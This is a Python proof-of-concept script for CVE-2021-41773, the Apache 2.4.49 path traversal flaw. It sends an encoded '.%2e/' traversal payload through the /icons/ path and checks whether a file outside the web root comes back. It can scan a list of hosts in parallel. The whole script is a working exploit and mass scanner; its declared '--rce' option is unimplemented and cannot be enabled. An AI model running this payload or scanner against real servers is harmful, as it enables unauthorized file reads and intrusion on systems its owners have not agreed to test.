############################################################################
# PoC for CVE-2021-41773                                                   #
# By: Jordan Jay (@0xLegacyy)                                              #
# Modified: Remon Svensson (@RemonSwe)                                     #
# Apache 2.4.49 is the only version vulnerable to this.                    #
############################################################################


# python main.py -f test.txt -C 5

import argparse
import urllib3
import time
from os import path
import multiprocessing as mp
import signal

# Default variable for amount of cores to run when args "-f" is run.
DEFAULT_CORES = '1'


def verify_args(args):
    if args:
        if not args.host and not args.targetFile:
            print("[*][GENERAL][WARNING] Requires atleast one of the following arguments\n"
                  "[--host TARGETHOST, -h TARGETHOST] [--file TARGETFILE, -f TARGETFILE]")
            return False
        if args.targetFile:
            if path.exists(args.targetFile):
                pass
            else:
                print(f"[*][FILE][WARNING] Target file \"{args.targetFile}\" could not be found...")
                return False
        if args.cores:
            if len(args.cores) == 1:
                char = ord(args.cores)
                if char < 49 or char > 57:
                    print(f"[*][CORES][WARNING] Amount of cores is entered 1 - 9")
                    return False
                else:
                    pass
            else:
                print(f"[*][CORES][WARNING] Maximum amount is 9, amount entered {args.cores}")
                return False
        return True
    else:
        print(f"[*][GENERAL][WARNING] No arguments given, do \"-h\" for information")
        return False


def chunkify(fname,chunkSize=4096):
    fileEnd = path.getsize(fname)
    with open(fname,'rb') as f:
        chunkEnd = f.tell()
        while True:
            chunkStart = chunkEnd
            f.seek(chunkSize,1)
            f.readline()
            chunkEnd = f.tell()
            yield chunkStart, chunkEnd - chunkStart
            if chunkEnd > fileEnd:
                break


def init_worker():
    signal.signal(signal.SIGINT, signal.SIG_IGN)


def process(poc, host, verifySsl):
    poc.host = host
    poc.verifySsl = verifySsl
    poc.run()
    return


def process_wrapper(chunkStart, chunkSize, fname, verifySsl):
    poc = POC()
    with open(fname) as f:
        f.seek(chunkStart)
        hosts = f.read(chunkSize).splitlines()
        for host in hosts:
            process(poc, host, verifySsl)


def check_host(host, ssl):
    # Try reading /usr/share/bash-completion/bash_completion, is world readable and in /usr/share, so default config should allow us to read it.
    # If we see the flag in the response, it's vulnerable.
    if not ("://" in host):
        print("[!] Host paramater missing protocol (http:// or https://)\n")
        return
    flag = "bash_completion - programmable completion functions for bash"
    payload = ".%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/usr/share/bash-completion/bash_completion"
    try:
        http = urllib3.PoolManager()
        response = http.request("GET", f"{host}/icons/{payload}")

        if flag not in response.data.decode("utf-8"):
            print(f"[-] {host} not vulnerable")
            return
        print(f"[+] {host} is vulnerable!")
    except(Exception):
        print("Exception:", host)


class POC:
    def __init__(self, args=None):
        if args is not None:
            self.host = args.host
            self.verifySsl = args.verifySsl
            self.file = args.targetFile
            if self.host and not self.file:
                self.single()
            else:
                self.cores = args.cores
                self.threaded()
        else:
            pass

    def single(self):
        check_host(self.host, self.verifySsl)

    def threaded(self):
        pool = mp.Pool(int(self.cores), init_worker)

        for chunkStart, chunkSize in chunkify(self.file):
            pool.apply_async(process_wrapper, (chunkStart, chunkSize, self.file, self.verifySsl))
        try:
            print("[*][INFO] To exit, press \"Ctrl + C\"")
            while pool._chunk:
                time.sleep(1)
        except KeyboardInterrupt:
            print("[*][MULTI][WARNING] Caught KeyboardInterrupt, terminating workers")
            pool.terminate()
            pool.join()

        pool.close()

    def run(self):
        check_host(self.host, self.verifySsl)


if __name__ == "__main__":

    # Set up args.
    parser = argparse.ArgumentParser(description="Checks if an apache server is vulnerable to CVE-2021-41773.")

    parser.add_argument(
        "--host", dest="host",
        help="ip/domain to be checked e.g. 'https://google.com/'."
    )
    parser.add_argument(
        "--nosslcheck", "-n", dest='verifySsl', action='store_false',
        help="Do not verify ssl certificates."
    )
    parser.add_argument(
        "--cores", "-C", dest="cores", default=DEFAULT_CORES,
        help=f"Specify number of cores that should be dedicated to the task, default: {DEFAULT_CORES}"
    )
    parser.add_argument(
        "--file", "-f", dest="targetFile", default=None,
        help="Specify file to fetch list of hosts from, example: \"/home/user/Desktop/myfile.txt\""
    )
    #TO-DO: Add functionality for flag --rce.
    parser.add_argument(
        "--rce", "-r", dest="rce", default=False, action="store_false",
        help="When toggled checks if target is susceptible to RCE"
    )


    parser.set_defaults(verifySsl=True)
    args = parser.parse_args()
    if verify_args(args):
        POC(args)
